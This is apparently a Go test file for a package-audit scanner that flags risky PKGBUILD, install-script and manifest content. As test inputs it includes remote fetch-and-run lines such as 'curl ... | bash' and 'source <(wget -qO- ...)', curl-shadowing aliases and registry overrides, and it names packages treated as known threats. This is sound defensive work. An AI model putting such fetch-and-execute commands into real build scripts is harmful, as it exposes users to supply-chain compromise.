package audit

import (
	"strings"
	"testing"
)

func testThreatBundle(t *testing.T) *ThreatBundle {
	t.Helper()
	bundle, err := LoadEmbeddedThreatBundle()
	if err != nil {
		t.Fatal(err)
	}
	return bundle
}

func findingByRule(findings []Finding, rule string) *Finding {
	for i := range findings {
		if findings[i].RuleID == rule {
			return &findings[i]
		}
	}
	return nil
}

func TestSemanticShellHardBlocksPrivilegeAndRemotePipeline(t *testing.T) {
	bundle := testThreatBundle(t)
	text := "package() {\n  curl --fail https://example.test/payload \\\n+    | bash\n  sudo install -Dm755 payload \"$pkgdir/usr/bin/payload\"\n}\n"
	findings := semanticTextFindings("PKGBUILD", text, false, true, bundle)
	for _, rule := range []string{"shell-remote-pipeline", "shell-privilege-command"} {
		finding := findingByRule(findings, rule)
		if finding == nil || !finding.HardBlock {
			t.Fatalf("missing hard block %s in %#v", rule, findings)
		}
	}
}

func TestSemanticInstallScriptPackageManagerIsHardBlock(t *testing.T) {
	findings := semanticTextFindings("demo.install", "post_install() { npm install harmless-package; }\n", false, true, testThreatBundle(t))
	finding := findingByRule(findings, "shell-ecosystem-install")
	if finding == nil || !finding.HardBlock {
		t.Fatalf("install-time package manager was not a hard block: %#v", findings)
	}
}

func TestSemanticBuildPackageManagerRequiresReview(t *testing.T) {
	findings := semanticTextFindings("PKGBUILD", "build() { npm install harmless-package; }\n", false, true, testThreatBundle(t))
	finding := findingByRule(findings, "shell-ecosystem-install")
	if finding == nil || finding.HardBlock || finding.Severity != "high" {
		t.Fatalf("build-time package manager should be a non-hard high finding: %#v", findings)
	}
}

func TestSemanticRecognizesBoundedBuildNetworkSteps(t *testing.T) {
	text := `prepare() {
  cargo fetch --locked --target "$(rustc -vV)"
  go mod download
	  git submodule update --init
	  npm ci
}
build() { curl https://example.test/arbitrary; }
`
	findings := semanticTextFindings("PKGBUILD", text, false, true, testThreatBundle(t))
	steps := knownNetworkSteps(&Report{Findings: findings}, "prepare")
	if !containsString(steps, "cargo fetch --locked") {
		t.Fatalf("locked Cargo fetch was not recognized: %#v", findings)
	}
	for _, forbidden := range []string{"curl", "git submodule update", "go mod download", "npm ci"} {
		if containsString(steps, forbidden) {
			t.Fatalf("unsafe or mutable step %q became automatic: %#v", forbidden, findings)
		}
	}
}

func TestSemanticDoesNotAutomaticallyEnableUnlockedCargoFetch(t *testing.T) {
	findings := semanticTextFindings("PKGBUILD", "prepare() { cargo fetch; }\n", false, true, testThreatBundle(t))
	if steps := knownNetworkSteps(&Report{Findings: findings}, "prepare"); len(steps) != 0 {
		t.Fatalf("unlocked Cargo fetch became automatic: %#v", steps)
	}
}

func TestSemanticScopesKnownNetworkStepToMakepkgProfile(t *testing.T) {
	findings := semanticTextFindings("PKGBUILD", "prepare() { cargo fetch --locked; }\nbuild() { cargo fetch --locked; }\n", false, true, testThreatBundle(t))
	report := &Report{Findings: findings}
	if got := knownNetworkSteps(report, "prepare"); len(got) != 1 || got[0] != "cargo fetch --locked" {
		t.Fatalf("prepare network steps=%#v", got)
	}
	if got := knownNetworkSteps(report, "build"); len(got) != 1 || got[0] != "cargo fetch --locked" {
		t.Fatalf("build network steps=%#v", got)
	}
}

func TestThreatIOCMatchesCommandsAndManifest(t *testing.T) {
	bundle := testThreatBundle(t)
	commandFindings := semanticTextFindings("PKGBUILD", "build() { bun add js-digest@1.2.3; }\n", false, true, bundle)
	if finding := findingByRule(commandFindings, "threat-aur-2026-js-digest"); finding == nil || !finding.HardBlock {
		t.Fatalf("command IOC did not hard block: %#v", commandFindings)
	}
	manifest := `{"dependencies":{"atomic-lockfile":"^1.0.0"}}`
	manifestFindings := structuredManifestFindings("package.json", manifest, bundle)
	if finding := findingByRule(manifestFindings, "threat-aur-2026-atomic-lockfile"); finding == nil || !finding.HardBlock {
		t.Fatalf("manifest IOC did not hard block: %#v", manifestFindings)
	}
	plainText := semanticTextFindings("README", "atomic-lockfile is discussed here", false, false, bundle)
	for _, finding := range plainText {
		if strings.HasPrefix(finding.RuleID, "threat-") {
			t.Fatalf("non-actionable prose matched IOC: %#v", plainText)
		}
	}
}

func TestSemanticParseFailureAndToolShadowFailClosed(t *testing.T) {
	bundle := testThreatBundle(t)
	bad := semanticTextFindings("PKGBUILD", "build() { if then; }\n", false, true, bundle)
	if finding := findingByRule(bad, "shell-parse-incomplete"); finding == nil || !finding.HardBlock {
		t.Fatalf("mandatory parse failure did not hard block: %#v", bad)
	}
	shadow := semanticTextFindings("PKGBUILD", "curl() { printf fake; }\nbuild() { curl example; }\n", false, true, bundle)
	if finding := findingByRule(shadow, "shell-tool-shadow"); finding == nil || !finding.HardBlock {
		t.Fatalf("tool shadow did not hard block: %#v", shadow)
	}
}

func TestSemanticParserHonorsExecutableInterpreter(t *testing.T) {
	bundle := testThreatBundle(t)
	makeRules := "#!/usr/bin/make -f\n%:\n\tdh $@ --with foo(bar\n"
	findings := semanticTextFindings("vendor/debian/rules", makeRules, true, true, bundle)
	if findingByRule(findings, "shell-parse-incomplete") != nil {
		t.Fatalf("make rules were parsed as Bash: %#v", findings)
	}
	badShell := semanticTextFindings("vendor/build-tool", "#!/bin/sh\nif then\n", true, true, bundle)
	if finding := findingByRule(badShell, "shell-parse-incomplete"); finding == nil || !finding.HardBlock {
		t.Fatalf("invalid executable shell escaped parsing: %#v", badShell)
	}
}

func TestEmbeddedThreatBundleIdentity(t *testing.T) {
	identity, err := EmbeddedThreatBundleIdentity()
	if err != nil {
		t.Fatal(err)
	}
	if identity.BundleVersion == "" || !validHexDigest(identity.SHA256) {
		t.Fatalf("invalid threat identity: %#v", identity)
	}
}

func TestSemanticShellWrappersRemoteSourceAndDynamicArrays(t *testing.T) {
	bundle := testThreatBundle(t)
	text := `alias curl='printf fake'
build() {
  command env LANG=C pacman -S forbidden
  source <(wget -qO- https://example.test/tool)
}
source=("$(printf dynamic)")
`
	findings := semanticTextFindings("PKGBUILD", text, false, true, bundle)
	for _, rule := range []string{"shell-tool-shadow", "shell-host-package-manager", "shell-remote-source", "shell-dynamic-source-array"} {
		if findingByRule(findings, rule) == nil {
			t.Errorf("missing semantic rule %s: %#v", rule, findings)
		}
	}
}

func TestStructuredManifestSourceOverrides(t *testing.T) {
	bundle := testThreatBundle(t)
	cases := map[string]string{
		".npmrc":               "registry=https://registry.example.test\n",
		"go.mod":               "module example.test/demo\nreplace old.test/module => ./local\n",
		".cargo/config.toml":   "registry = \"private\"\n",
		"pip.conf":             "index-url = https://packages.example.test/simple\n",
		"pyproject.toml":       "extra_index_url = https://packages.example.test/simple\n",
		"nested/random.config": "registry = ignored\n",
	}
	for file, content := range cases {
		findings := structuredManifestFindings(file, content, bundle)
		if strings.Contains(file, "random") {
			if len(findings) != 0 {
				t.Errorf("unscoped config file produced findings: %#v", findings)
			}
			continue
		}
		if findingByRule(findings, "manifest-source-override") == nil {
			t.Errorf("source override in %s was missed: %#v", file, findings)
		}
	}
}

func TestJSONManifestLifecycleRegistryAndInvalidInput(t *testing.T) {
	bundle := testThreatBundle(t)
	manifest := `{"scripts":{"prepare":"node build.js","test":"node test.js"},"registry":"https://registry.example.test","publishConfig":{"registry":"https://publish.example.test"},"packages":{"node_modules/lockfile-js":{"version":"1"}}}`
	findings := jsonManifestFindings("package-lock.json", manifest, bundle)
	for _, rule := range []string{"manifest-lifecycle-script", "manifest-registry-override", "threat-aur-2026-lockfile-js"} {
		if findingByRule(findings, rule) == nil {
			t.Errorf("missing JSON manifest rule %s: %#v", rule, findings)
		}
	}
	if finding := findingByRule(jsonManifestFindings("package.json", "{", bundle), "manifest-json-invalid"); finding == nil || !finding.HardBlock {
		t.Fatal("invalid package manifest did not fail closed")
	}
}

func TestThreatBundleRejectsInvalidProvenance(t *testing.T) {
	previous := embeddedThreatBundle
	t.Cleanup(func() { embeddedThreatBundle = previous })
	entry := `{"id":"test-entry","kind":"ecosystem_package","ecosystem":"npm","value":"demo","disposition":"hard_block","source_url":"https://example.test/advisory","first_seen":"2026-01-01"}`
	cases := []string{
		`{`,
		`{"schema_version":2,"bundle_version":"test-v1","reviewed_at":"2026-01-01T00:00:00Z","entries":[` + entry + `]}`,
		`{"schema_version":1,"bundle_version":"test-v1","reviewed_at":"invalid","entries":[` + entry + `]}`,
		`{"schema_version":1,"bundle_version":"test-v1","reviewed_at":"2026-01-01T00:00:00Z","entries":[]}`,
		`{"schema_version":1,"bundle_version":"test-v1","reviewed_at":"2026-01-01T00:00:00Z","entries":[{"id":"x","kind":"other"}]}`,
		`{"schema_version":1,"bundle_version":"test-v1","reviewed_at":"2026-01-01T00:00:00Z","entries":[{"id":"test-entry","kind":"ecosystem_package","ecosystem":"npm","value":"demo","disposition":"hard_block","source_url":"http://example.test","first_seen":"2026-01-01"}]}`,
		`{"schema_version":1,"bundle_version":"test-v1","reviewed_at":"2026-01-01T00:00:00Z","entries":[{"id":"test-entry","kind":"ecosystem_package","ecosystem":"npm","value":"demo","disposition":"hard_block","source_url":"https://example.test","first_seen":"invalid"}]}`,
		`{"schema_version":1,"bundle_version":"test-v1","reviewed_at":"2026-01-01T00:00:00Z","entries":[` + entry + `,{"id":"test-entry-2","kind":"ecosystem_package","ecosystem":"npm","value":"demo","disposition":"hard_block","source_url":"https://example.test/second","first_seen":"2026-01-02"}]}`,
	}
	for index, raw := range cases {
		embeddedThreatBundle = []byte(raw)
		if _, err := LoadEmbeddedThreatBundle(); err == nil {
			t.Errorf("invalid threat bundle %d accepted", index)
		}
	}
}

func TestPackageIdentityNormalization(t *testing.T) {
	cases := map[string]string{
		"":                         "",
		"'demo@1.2.3',":            "demo",
		"@scope/package@2.0.0":     "@scope/package",
		"@scope/package":           "@scope/package",
		"https://example.test/pkg": "https://example.test/pkg",
	}
	for input, wanted := range cases {
		if actual := packageIdentity(input); actual != wanted {
			t.Errorf("packageIdentity(%q)=%q, want %q", input, actual, wanted)
		}
	}
	if _, ok := (*ThreatBundle)(nil).ecosystemPackage("npm", "demo"); ok {
		t.Fatal("nil threat bundle returned a match")
	}
}
